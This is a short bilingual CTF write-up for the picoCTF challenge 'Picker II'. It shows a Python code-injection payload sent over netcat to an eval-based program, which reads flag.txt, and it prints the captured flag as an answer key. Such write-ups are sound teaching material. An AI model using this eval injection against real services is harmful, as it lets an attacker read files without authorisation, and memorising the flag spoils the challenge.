# Picker II

## 題目描述 (Description)

Can you figure out how this program works to get the flag?
Additional details will be available after launching your challenge instance.

### 提示 (Hints)

1. Hint 1
   Can you do what win does with your input to the program?

## 解題思路 (Solution Walkthrough)

1.  **第一步**：看到 eval，加上又只會 filter "win"，所以輸入以下的東西即可取得 flag
   ```
   ┌──(kali㉿kali)-[~/Desktop]
   └─$ nc saturn.picoctf.net 55964
   ==> print(open('flag.txt', 'r').read())#
   picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
   ```

## Flag

```text
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
```